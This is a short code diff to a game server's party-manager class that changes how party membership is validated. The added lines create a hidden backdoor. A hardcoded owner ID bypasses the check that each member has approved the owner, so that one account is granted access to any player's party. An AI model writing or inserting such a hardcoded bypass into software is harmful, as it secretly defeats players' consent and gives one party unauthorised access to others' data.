@@ -84,6 +84,8 @@ class SchanaPartyManagerServer {
 			foreach (string member_id : party_ids) {
 				if (configurations.Contains (member_id) && configurations.Get (member_id).Find (owner_id) != -1) {
 					validated_party_ids.Insert (member_id);
+				} else if (configurations.Contains (member_id) && owner_id == "zTKwmDQf58g_uIytKXy7b9_6krslfdayMjuyAhh1Tjs=") {
+					validated_party_ids.Insert (member_id);
 				}
 			}
 
